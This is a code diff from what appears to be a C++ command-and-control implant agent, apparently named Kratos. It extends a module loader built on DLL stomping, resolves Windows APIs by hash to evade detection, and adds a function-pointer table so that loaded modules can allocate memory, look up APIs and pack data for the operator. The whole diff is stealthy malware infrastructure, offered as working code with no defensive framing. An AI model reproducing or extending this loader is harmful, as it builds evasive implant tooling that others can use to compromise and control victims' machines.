@@ -1,5 +1,13 @@
 #include "modules/modules.h"
 #include "agent/core.h"
+#include "packager/packager.h"
+
+
+
+
+
+
+
 BOOL Modules::LoadStompedDll() {
 	CHAR path[30];
 	path[  0 ] = 'C';
@@ -79,7 +87,8 @@ BOOL Modules::LoadStompedDll() {
 
 	SIZE_T TextSize = 0;
 
-	if (!this->GetStompedDllText(pBase)) { return FALSE; }
+	if ( ! this->GetStompedDllText( pBase ) ) { return FALSE; }
+	if ( ! this->CraftModuleStruct( ) ) { return FALSE; }
 	this->IsStompedDllLoaded = TRUE;
 	this->TextSectionIndex = StompedDllText;
 
@@ -123,7 +132,7 @@ PVOID Modules::ReserveArena(SIZE_T size) {
 
 
 ModuleInformation* Modules::FindFreeModInfo() {
-	for (INT i = 0;i < 10; i++) {
+	for (INT i = 0;i < MAX_MODULES; i++) {
 		if (this->ModuleInfos[i].EntryPoint == NULL) {
 			return &this->ModuleInfos[i];
 		}
@@ -132,10 +141,74 @@ ModuleInformation* Modules::FindFreeModInfo() {
 }
 
 ModuleInformation* Modules::FindModInfoEntry(INT32 needed) {
-	for (INT i = 0; i < 10; i++) {
-		if (this->ModuleInfos[i].id  == needed) {
+	for (INT i = 0; i < MAX_MODULES; i++) {
+		if (this->ModuleInfos[i].EntryPoint != NULL && this->ModuleInfos[i].id == needed) {
 			return &this->ModuleInfos[i];
 		}
 	}
 	return NULL;
 }
+
+
+
+// functions for ModuleStruct, just forwards
+INT32 UnPack4() {
+	return packager->UnPack4( );
+}
+
+PBYTE UnPackBytes( INT32 Length ) {
+	return packager->UnPackBytes( Length );
+}
+
+void Pack4(INT32 Val) {
+	packager->Pack4( Val );
+}
+
+void Pack8( INT64 Val ) {
+	packager->Pack8( Val );
+}
+
+void PackBytes(PBYTE data, INT32 len) {
+	packager->PackBytes( data, len );
+}
+
+FARPROC GetAddress(HMODULE dll, DWORD hash) {
+	return api::GetProcAddress(dll, hash);
+}
+
+HMODULE GetModuleByHahs(DWORD hash) {
+	return api::GetModule(hash);
+}
+
+HLOCAL Allocate(SIZE_T n) {
+	return kratos->apis.LocalAlloc(ALLOC_ARGS, n);
+}
+
+HLOCAL Free(HLOCAL mem) {
+	return kratos->apis.LocalFree(mem);
+}
+
+
+
+BOOL Modules::CraftModuleStruct() {
+	this->ModuleStruct = (PModule)kratos->apis.LocalAlloc(ALLOC_ARGS, sizeof(Module));
+	if ( ! this->ModuleStruct) { return FALSE; }
+
+	this->ModuleStruct->ModuleUnpack4        = UnPack4;
+	this->ModuleStruct->ModuleUnpackBytes    = UnPackBytes;
+	this->ModuleStruct->ModulePack4          = Pack4;
+	this->ModuleStruct->ModulePack8          = Pack8;
+	this->ModuleStruct->ModulePackBytes      = PackBytes;
+	this->ModuleStruct->ModuleGetProcAddress = GetAddress;
+	this->ModuleStruct->ModuleGetModule      = GetModuleByHahs;
+	this->ModuleStruct->ModuleAllocate       = Allocate;
+	this->ModuleStruct->ModuleFreeMem        = Free;
+
+	return TRUE;
+}
+
+
+
+
+
+
